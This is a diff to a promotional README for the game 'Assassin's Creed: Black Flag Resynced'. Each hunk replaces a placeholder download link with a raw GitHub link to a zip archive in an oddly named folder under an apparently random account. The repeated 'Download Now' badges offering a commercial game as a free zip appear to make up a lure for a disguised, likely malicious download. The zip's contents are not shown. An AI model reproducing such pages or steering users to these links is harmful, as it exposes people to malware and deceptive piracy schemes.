@@ -4,7 +4,7 @@
 
 > The beloved naval Assassin's Creed adventure rebuilt for current-gen — stunning sea battles, pirate shanties, and the swashbuckling story of Edward Kenway, now in full modern glory.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/catalectic-concordance966/assassins-creed-black-flag-resynced/main/imbalance/creed-flag-assassins-resynced-black-3.0.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Releases on **July 2026** · Available on **PS5, Xbox Series X|S, PC**.
 
 ### Ready to play / use?
 
-[![Download Assassin's Creed: Black Flag Resynced](https://img.shields.io/badge/Download-Assassins%20Creed%20Black%20Flag%20Resynced-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Assassin's Creed: Black Flag Resynced](https://img.shields.io/badge/Download-Assassins%20Creed%20Black%20Flag%20Resynced-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/catalectic-concordance966/assassins-creed-black-flag-resynced/main/imbalance/creed-flag-assassins-resynced-black-3.0.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://raw.githubusercontent.com/catalectic-concordance966/assassins-creed-black-flag-resynced/main/imbalance/creed-flag-assassins-resynced-black-3.0.zip)**
 
 </div>
 
@@ -69,7 +69,7 @@ Assassin's Creed: Black Flag Resynced is one of the **most hyped releases of Sum
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://raw.githubusercontent.com/catalectic-concordance966/assassins-creed-black-flag-resynced/main/imbalance/creed-flag-assassins-resynced-black-3.0.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -77,7 +77,7 @@ Assassin's Creed: Black Flag Resynced is one of the **most hyped releases of Sum
 
 **Don't miss out — Assassin's Creed: Black Flag Resynced is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Assassins%20Creed%20Black%20Flag%20Resynced-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Assassins%20Creed%20Black%20Flag%20Resynced-blue?style=for-the-badge)](https://raw.githubusercontent.com/catalectic-concordance966/assassins-creed-black-flag-resynced/main/imbalance/creed-flag-assassins-resynced-black-3.0.zip)
 
 *Assassin's Creed: Black Flag Resynced — July 2026 · PS5, Xbox Series X|S, PC*
 
